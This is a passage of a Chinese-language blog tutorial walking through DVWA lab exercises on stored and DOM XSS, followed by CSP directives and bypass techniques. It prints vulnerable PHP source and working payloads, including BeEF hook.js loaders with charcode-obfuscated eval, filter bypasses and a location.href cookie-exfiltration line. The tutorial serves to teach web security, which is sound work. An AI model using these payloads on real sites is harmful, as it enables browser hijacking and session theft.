<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">	// Sanitize message input</span><br><span class="line">	$message = stripslashes( $message );</span><br><span class="line">	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Sanitize name input</span><br><span class="line">	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Update database</span><br><span class="line">	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>在留言板键入 <code>&lt;script src=&quot;http://192.168.152.128:3000/hook.js&quot;&gt;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927163730628.png"
                      alt="image-20230927163730628"
                ></p>
<p>成功上线BeEF。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927163814502.png"
                      alt="image-20230927163814502"
                ></p>
<p><strong>level: Medium</strong></p>
<p>源码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">	// Sanitize message input</span><br><span class="line">	$message = strip_tags( addslashes( $message ) );</span><br><span class="line">	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">	$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">	// Sanitize name input</span><br><span class="line">	$name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name );</span><br><span class="line">	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Update database</span><br><span class="line">	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>str_replace</code> 可以通过双写或者大写等绕过。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;scrip&lt;script&gt;t&gt;<span class="attr">http</span>:<span class="comment">//192.168.152.128:3000/hook.js&lt;/scrip&lt;script&gt;t&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>限制了输入长度，将其改为 200。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927172843131.png"
                      alt="image-20230927172843131"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173103574.png"
                      alt="image-20230927173103574"
                ></p>
<p>成功上线 BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173151375.png"
                      alt="image-20230927173151375"
                ></p>
<p><strong>level: High</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">	// Sanitize message input</span><br><span class="line">	$message = strip_tags( addslashes( $message ) );</span><br><span class="line">	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">	$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">	// Sanitize name input</span><br><span class="line">	$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name );</span><br><span class="line">	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Update database</span><br><span class="line">	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>和 xss-r 的 High 难度一样，通过编码绕过。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;nonexistent.jpg&quot;</span> onerror=<span class="string">&quot;eval(&#x27;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,53,50,46,49,50,56,58,51,48,48,48,47,104,111,111,107,46,106,115);document.head.appendChild(s);&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>修改 Message 可输入长度。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173609007.png"
                      alt="image-20230927173609007"
                ></p>
<p>成功上线 BeEF。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173705996.png"
                      alt="image-20230927173705996"
                ></p>
<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><p>DOM 型 XSS 可以在前端通过 js 渲染来完成数据的交互，达到插入数据造成 XSS 脚本攻击。因 ‘#’ 后面的内容不会发送到服务器上，所以即使抓包无无法抓取到这里的流量，也不会经过服务器过滤器阻止。而反射性与存储型 XSS 需要与服务器交互，这便是三者的区别。</p>
<p><a class="link"   href="https://blog.csdn.net/qq_53577336/article/details/122441536" >DOM参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h5 id="dvwa-例题-2"><a href="#dvwa-例题-2" class="headerlink" title="dvwa 例题"></a>dvwa 例题</h5><p><strong>level: Low</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># No protections, anything goes</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>select 任意一种语言后</p>
<p><code>URL: http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927184520953.png"
                      alt="image-20230927184520953"
                ></p>
<p>更改 default 参数。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://192.168.152.128:3000/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p> 成功上线 BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927185920467.png"
                      alt="image-20230927185920467"
                ></p>
<p><strong>level: Medium</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123;</span><br><span class="line">	$default = $_GET[&#x27;default&#x27;];</span><br><span class="line"></span><br><span class="line">	# Do not allow script tags</span><br><span class="line">	if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;</span><br><span class="line">		header (&quot;location: ?default=English&quot;);</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>不允许 <code>&lt;script</code> 执行，更换闭合方式即可。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/option&gt;&lt;/</span>select&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;eval(&#x27;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,53,50,46,49,50,56,58,51,48,48,48,47,104,111,111,107,46,106,115);document.head.appendChild(s);&#x27;)&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<p>成功上线 BeEF。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927192547528.png"
                      alt="image-20230927192547528"
                ></p>
<p><strong>level: High</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123;</span><br><span class="line"></span><br><span class="line">	# White list the allowable languages</span><br><span class="line">	switch ($_GET[&#x27;default&#x27;]) &#123;</span><br><span class="line">		case &quot;French&quot;:</span><br><span class="line">		case &quot;English&quot;:</span><br><span class="line">		case &quot;German&quot;:</span><br><span class="line">		case &quot;Spanish&quot;:</span><br><span class="line">			# ok</span><br><span class="line">			break;</span><br><span class="line">		default:</span><br><span class="line">			header (&quot;location: ?default=English&quot;);</span><br><span class="line">			exit;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>服务端的白名单，可用 # 绕过，# 后的 js 将在本地解析，而不会上传至服务器，并且这个脚本对以上通用。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?default=English#&lt;script src=&quot;http://192.168.152.128:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>成功上线 BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927193324140.png"
                      alt="image-20230927193324140"
                ></p>
<h2 id="XSS进阶"><a href="#XSS进阶" class="headerlink" title="XSS进阶"></a>XSS进阶</h2><h3 id="CSP简述"><a href="#CSP简述" class="headerlink" title="CSP简述"></a>CSP简述</h3><p>CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，采取白名单制度，开发者告诉客户端，哪些外部资源可以加载和执行，哪些不可以。通过 <code>HTTP</code> 消息头或者 <code>HTML</code> 的 <code>Meta</code> 标签中设置。正常 <code>CSP</code> 有多组策略组成，每组策略包含一个策略指令和内容源列表。</p>
<ul>
<li><p>通过<code>HTTP</code>消息头设置：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27; allowed.com; img-src &#x27;self&#x27; allowed.com; style-src &#x27;self&#x27;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>通过<code>HTML</code> 的 <code>Meta</code> 标签中设置：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; img-src https://*; child-src &#x27;none&#x27;;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><strong>CSP指令</strong></p>
<ul>
<li>script-src：外部脚本</li>
<li>style-src：样式表</li>
<li>img-src：图像</li>
<li>media-src：媒体文件（音频和视频）</li>
<li>font-src：字体文件</li>
<li>object-src：插件（比如 Flash）</li>
<li>child-src：框架</li>
<li>frame-ancestors：嵌入的外部资源（比如<code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>）</li>
<li>connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li>
<li>worker-src：worker脚本</li>
<li>manifest-src：manifest 文件</li>
<li>dedault-src：默认配置</li>
<li>frame-ancestors：限制嵌入框架的网页</li>
<li>base-uri：限制&lt;base#href&gt;</li>
<li>form-action：限制&lt;form#action&gt;</li>
<li>block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li>
<li>upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li>
<li>plugin-types：限制可以使用的插件格式</li>
<li>sandbox：浏览器行为的限制，比如不能有弹出窗口等。</li>
</ul>
<p><strong>CSP指令值</strong></p>
<ul>
<li>*： 星号表示允许任何URL资源，没有限制；</li>
<li>self： 表示仅允许来自同源（相同协议、相同域名、相同端口）的资源被页面加载；</li>
<li>data：仅允许数据模式（如Base64编码的图片）方式加载资源；</li>
<li>none：不允许任何资源被加载；</li>
<li>unsafe-inline：允许使用内联资源，例如内联<code>&lt;script&gt;</code>标签，内联事件处理器，内联<code>&lt;style&gt;</code>标签等，但出于安全考虑，不建议使用；</li>
<li>nonce：通过使用一次性加密字符来定义可以执行的内联js脚本，服务端生成一次性加密字符并且只能使用一次；</li>
</ul>
<h3 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a><a class="link"   href="https://zhuanlan.zhihu.com/p/368865224" >CSP绕过 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><h4 id="location-href绕过"><a href="#location-href绕过" class="headerlink" title="location.href绕过"></a>location.href绕过</h4><p>很多网站常常不得已需要执行内联，CSP不影响location.href跳转。我们可以借此执行 <code>JavaScript</code>，也可以利用 <code>loction</code>跳转外带数据。</p>
<p><strong>location-herf.php</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (!isset($_COOKIE[&#x27;a&#x27;])) &#123;</span><br><span class="line">        setcookie(&#x27;a&#x27;,md5(rand(0,1000)));</span><br><span class="line">    &#125;</span><br><span class="line">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP-safe&lt;/h2&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">        echo &quot;Your GET content&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class="line">    &#125;//</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231007165318034.png"
                      alt="image-20231007165318034"
                ></p>
<p><strong>payload</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">?a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;http://127.0.0.1&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231007165343194.png"
                      alt="image-20231007165343194"
                ></p>
<h4 id="dvwa-例题-3"><a href="#dvwa-例题-3" class="headerlink" title="dvwa 例题"></a>dvwa 例题</h4><h5 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h5><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"># These might work if you can&#x27;t create your own for some reason</span><br><span class="line"># https://pastebin.com/raw/R570EE00</span><br><span class="line"># https://www.toptal.com/developers/hastebin/raw/cezaruzeka</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &lt;script src=&#x27;&quot; . $_POST[&#x27;include&#x27;] . &quot;&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &#x27;</span><br><span class="line">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span><br><span class="line">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&#x27;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 白名单</span><br><span class="line">https://pastebin.com</span><br><span class="line">hastebin.com</span><br><span class="line">example.com</span><br><span class="line">code.jquery.com</span><br><span class="line">https://ssl.google-analytics.com</span><br></pre></td></tr></table></figure></div>

<p>headerCSP 放置了一些 url，使用 script src 指令 指向一个外部 JavaScript 文件，header() 函数以原始形式将 HTTP 标头发送到客户端或浏览器，源码对 HTTP 头定义了 CSP 标签，从而定义了可以接受外部 JavaScript 资源的白名单。</p>
<ul>
<li>Attack</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011111416286.png"
                      alt="image-20231011111416286"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011111726446.png"
                      alt="image-20231011111726446"
                ></p>
<p>首先在白名单网站<code>https://pastebin.com/</code>里边创建一个 <code>JavaScript</code> 代码<code>alert(&quot;XSS&quot;)</code>保存记住链接<code>eg: https://pastebin.com/raw/Qp0pTUvF</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011111850527.png"
                      alt="image-20231011111850527"
                ></p>
<p>输入后，点击<code>include</code>。因为网站在是国外的，访问较慢，可能不会出现弹窗。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011112448886.png"
                      alt="image-20231011112448886"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011112509622.png"
                      alt="image-20231011112509622"
                > </p>
<p>抓包看一下，请求已经发送出去了。</p>
<h5 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h5><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">// Disable XSS protections so that inline alert boxes will work</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line"></span><br><span class="line"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &quot; . $_POST[&#x27;include&#x27;] . &quot;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &#x27;</span><br><span class="line">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span><br><span class="line">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&#x27;;</span><br></pre></td></tr></table></figure></div>

<p><code>CSP</code> 策略尝试使用 <code>nonce</code> 来防止攻击者添加内联脚本。<code>HTTP</code> 头信息中的 <code>script-src</code> 的合法来源发生了变化。<code>script-src</code> 还可以设置一些特殊值，<code>unsafe-inline</code> 允许执行页面内嵌的 <code>&lt;script&gt;</code>标签和事件监听函数，<code>nonce</code> 值会在每次 <code>HTTP</code> 回应给出一个授权 <code>token</code>。</p>
<ul>
<li>Attack</li>
</ul>
<p><code>payload</code>:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script nonce=<span class="string">&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;</span>&gt;<span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011114921730.png"
                      alt="image-20231011114921730"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011114940467.png"
                      alt="image-20231011114940467"
                ></p>
<p>直接通过内联 <code>JavaScript</code> 代码，注入时直接令 <code>nonce</code> 为设定好的值即可。</p>
